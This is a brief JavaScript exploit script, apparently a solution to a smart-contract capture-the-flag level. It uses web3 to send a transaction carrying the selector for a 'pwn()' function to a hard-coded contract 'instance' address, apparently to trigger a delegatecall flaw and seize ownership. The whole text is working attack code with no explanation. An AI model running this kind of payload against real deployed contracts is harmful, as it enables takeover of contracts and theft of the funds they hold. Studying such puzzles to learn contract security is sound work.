(async () => {
  const accounts = await web3.eth.getAccounts();
  const instanceAddress = "0x91e4877E68B779D95d0f3c8A70A4eB43c3558431";
  
  const payload = web3.eth.abi.encodeFunctionSignature("pwn()");
  
  const receipt = await web3.eth.sendTransaction({ from: accounts[0], to: instanceAddress, data: payload });
  
  console.log(receipt)
})()